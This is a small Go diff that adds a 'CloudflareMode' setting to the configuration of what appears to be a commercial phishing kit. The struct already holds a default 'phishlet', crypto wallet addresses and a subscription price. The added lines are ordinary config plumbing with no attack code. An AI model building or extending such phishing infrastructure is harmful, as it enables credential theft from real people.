@@ -126,6 +126,7 @@ type GeneralConfig struct {
 	CryptoUSDT           string `mapstructure:"crypto_usdt" json:"crypto_usdt" yaml:"crypto_usdt"`
 	SubPrice             int    `mapstructure:"sub_price" json:"sub_price" yaml:"sub_price"`
 	DefaultPhishlet      string `mapstructure:"default_phishlet" json:"default_phishlet" yaml:"default_phishlet"`
+	CloudflareMode       bool   `mapstructure:"cloudflare_mode" json:"cloudflare_mode" yaml:"cloudflare_mode"`
 }
 
 type DNSEntry struct {
@@ -1156,3 +1157,5 @@ func (c *Config) SetCryptoETH(v string)         { c.general.CryptoETH = v; c.cfg
 func (c *Config) SetCryptoUSDT(v string)        { c.general.CryptoUSDT = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
 func (c *Config) SetSubPrice(v int)             { c.general.SubPrice = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
 func (c *Config) SetDefaultPhishlet(v string)   { c.general.DefaultPhishlet = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) GetCloudflareMode() bool       { return c.general.CloudflareMode }
+func (c *Config) SetCloudflareMode(v bool)      { c.general.CloudflareMode = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
